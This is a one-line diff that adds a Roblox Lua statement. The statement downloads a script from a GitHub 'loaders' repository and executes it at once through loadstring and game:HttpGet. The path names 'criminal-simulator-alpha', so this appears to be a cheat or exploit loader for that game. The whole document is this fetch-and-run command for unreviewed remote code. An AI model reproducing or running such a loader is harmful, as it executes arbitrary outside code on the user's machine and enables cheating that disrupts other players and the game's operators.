@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/criminal-simulator-alpha-spam7-r604zsczo4d6gx.lua"))()
